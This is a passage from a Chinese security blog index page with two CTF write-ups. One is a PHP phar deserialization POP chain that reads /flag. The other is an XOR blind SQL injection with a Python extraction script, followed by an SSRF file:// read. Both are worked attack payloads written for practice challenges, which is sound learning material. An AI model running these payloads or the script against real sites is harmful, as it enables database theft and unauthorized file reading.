ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($d);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure>
<p>以及</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new View();</span><br><span class="line">$a-&gt;fn = &#x27;/flag&#x27;;</span><br><span class="line">$b = new Fun();</span><br><span class="line">$b-&gt;fun = $a;</span><br><span class="line">$c = new Fun();</span><br><span class="line">$c-&gt;fun = $b;</span><br><span class="line">@unlink(&quot;phar.tar&quot;);</span><br><span class="line">@system(&#x27;rm -r .phar&#x27;);</span><br><span class="line">@system(&#x27;mkdir .phar&#x27;);</span><br><span class="line">file_put_contents(&#x27;.phar/.metadata&#x27;,serialize($c));</span><br><span class="line">system(&#x27;tar -cf phar.tar .phar/*&#x27;);</span><br></pre></td></tr></table></figure>
<p>然后构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar://./phar.tar</span><br><span class="line">phar:///var/www/html/uploads/phar.tar</span><br></pre></td></tr></table></figure>
<p>即可通过 phar 反序列化触发 pop 链得到 flag </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-异或注入及ssrf读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/15/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E5%8F%8Assrf%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-08-14T16:00:00.000Z" itemprop="datePublished">2021-08-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/15/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E5%8F%8Assrf%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
        异或注入或盲注及ssrf读取漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="异或注入或盲注及ssrf读取漏洞"><a href="#异或注入或盲注及ssrf读取漏洞" class="headerlink" title="异或注入或盲注及ssrf读取漏洞"></a>异或注入或盲注及ssrf读取漏洞</h1><p>通过信息收集，发现有username和password，但是尝试过都不能注入，然后再打开index.html文件，发现有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/image.php?id=3</span><br></pre></td></tr></table></figure>
<p>推测此为注入点，然后使用异或注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1</span><br></pre></td></tr></table></figure>
<p>发现有回显，然后更换参数，直到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1</span><br></pre></td></tr></table></figure>
<p>没有产生回显，可知数据库第一个字母为1</p>
<p>以此类推，按原理写一个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://url/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;</span><br><span class="line">word=&quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    l = 32</span><br><span class="line">    h = 128</span><br><span class="line">    mid = (l + h)</span><br><span class="line">    while (l &lt; h):</span><br><span class="line">        nurl=url.format(i,mid)</span><br><span class="line">        r=requests.get(url=nurl)</span><br><span class="line">        if &#x27;JFIF&#x27; in r.text:</span><br><span class="line">            l = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            h = mid</span><br><span class="line">        mid = (l + h) // 2</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">    word += chr(mid)</span><br><span class="line">    print(word)</span><br><span class="line">print(word)</span><br></pre></td></tr></table></figure>
<p>得到表名为users</p>
<p>通过修改url的值继续爆破，得到密码值</p>
<p>而后登录账号，发现是ssrf读取文件漏洞，尝试构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:// /flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/6/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/8/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>